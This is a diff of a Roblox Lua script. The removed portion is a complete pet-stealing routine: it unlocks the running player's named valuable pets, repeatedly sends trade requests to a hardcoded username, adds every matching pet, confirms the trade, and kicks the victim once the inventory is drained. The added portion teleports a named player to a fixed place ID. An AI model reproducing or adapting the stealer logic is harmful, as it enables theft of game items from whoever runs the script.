@@ -1,169 +1,19 @@
-local targetUsername = "Ebikeu"
-local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot", "Grand Ice Wizard"}
+local TeleportService = game:GetService("TeleportService")
+local playerName = "Keiyoz"
+local PlaceId = 75992362647444
 
--- SERVICES
-local Players = game:GetService("Players")
-local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
-local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)
+-- Find the player by name
+local player = game.Players:FindFirstChild(playerName)
 
--- VARIABLES
-local player = Players.LocalPlayer
-
--- FUNCTIONS
-function WaitForCondition(conditionFunc, timeout)
-    local startTime = tick()
-    while not conditionFunc() do
-        if tick() - startTime > (timeout or 30) then
-            return false
-        end
-        task.wait()
-    end
-    return true
-end
-
-function UnlockPets()
-    local PetNames = {}
-    for _, name in ipairs(petsToTrade) do
-        PetNames[name] = true
-    end
+if player then
+    -- Attempt to teleport the player
+    local success, message = pcall(function()
+        TeleportService:Teleport(PlaceId, player)
+    end)
     
-    local pets = Replication.Data and Replication.Data.Pets
-    if not pets then return end
-    
-    for _, petData in pairs(pets) do
-        if petData
-            and petData.Name
-            and PetNames[petData.Name]
-            and (petData.Locked == true or petData.Locked == 1 or petData.Locked == "true")
-        then
-            Network:InvokeServer("LockPet", petData.Id, false)
-        end
+    if not success then
+        warn("Teleport failed: " .. message)
     end
-end
-
-function GetPetIDsByName()
-    local petIDs = {}
-    local pets = Replication.Data and Replication.Data.Pets
-    if not pets then return petIDs end
-    
-    local petNameLookup = {}
-    for _, name in ipairs(petsToTrade) do
-        petNameLookup[name] = true
-    end
-    
-    for _, petData in pairs(pets) do
-        if petData and petData.Name and petNameLookup[petData.Name] then
-            table.insert(petIDs, petData.Id)
-        end
-    end
-    
-    return petIDs
-end
-
-function HasPetsToTrade()
-    local petIDs = GetPetIDsByName()
-    return #petIDs > 0
-end
-
-function FindTargetPlayer()
-    return Players:FindFirstChild(targetUsername)
-end
-
-function WaitForPetsRemoved(tradedPetIDs)
-    local startTime = tick()
-    
-    while tick() - startTime < 3 do
-        local currentPetIDs = GetPetIDsByName()
-        
-        local allRemoved = true
-        for _, tradedId in ipairs(tradedPetIDs) do
-            local stillHas = false
-            for _, currentId in ipairs(currentPetIDs) do
-                if currentId == tradedId then
-                    stillHas = true
-                    break
-                end
-            end
-            if stillHas then
-                allRemoved = false
-                break
-            end
-        end
-        
-        if allRemoved then
-            return true
-        end
-        
-        task.wait(0.1)
-    end
-    
-    return false
-end
-
-function TradeWithTarget()
-    while true do
-        if not HasPetsToTrade() then
-            print("No pets to trade! Kicking...")
-            player:Kick("No more pets to trade")
-            return
-        end
-        
-        -- Ensure UnlockPets happens after checking pets
-        UnlockPets()
-
-        local target = FindTargetPlayer()
-        if not target then
-            task.wait(5)
-            return
-        end
-        
-        -- Spam trade request every second until the trade window opens
-        while not player.PlayerGui.Trading.Enabled do
-            Network:FireServer("SendTrade", target)
-            task.wait(1)
-        end
-        
-        -- Once in trade, keep adding pets to the trade
-        local petIDs = GetPetIDsByName()
-        if #petIDs > 0 then
-            for _, petId in ipairs(petIDs) do
-                Network:InvokeServer("AddTradeItem", { "Pet", petId })
-            end
-            
-            -- Ready up and keep adding pets until trade is completed
-            Network:FireServer("ReadyUp", false, true)
-            
-            local tradeCompleted = WaitForCondition(function()
-                return not player.PlayerGui.Trading.Enabled
-            end, 10)
-            
-            if not tradeCompleted then
-                Network:FireServer("CloseTrade")
-                task.wait(0.5)
-            else
-                WaitForPetsRemoved(petIDs)
-            end
-        end
-        
-        -- If still have pets to trade, continue trading
-        if HasPetsToTrade() then
-            print("Re-entering trade with remaining pets")
-            task.wait(1)
-        else
-            print("No more pets left to trade.")
-            break
-        end
-    end
-end
-
--- MAIN LOGIC
-while true do
-    if not HasPetsToTrade() then
-        player:Kick("No more pets to trade")
-        break
-    end
-    
-    print("Starting trade process.")
-    TradeWithTarget()
-    task.wait(1)
+else
+    warn("Player not found.")
 end
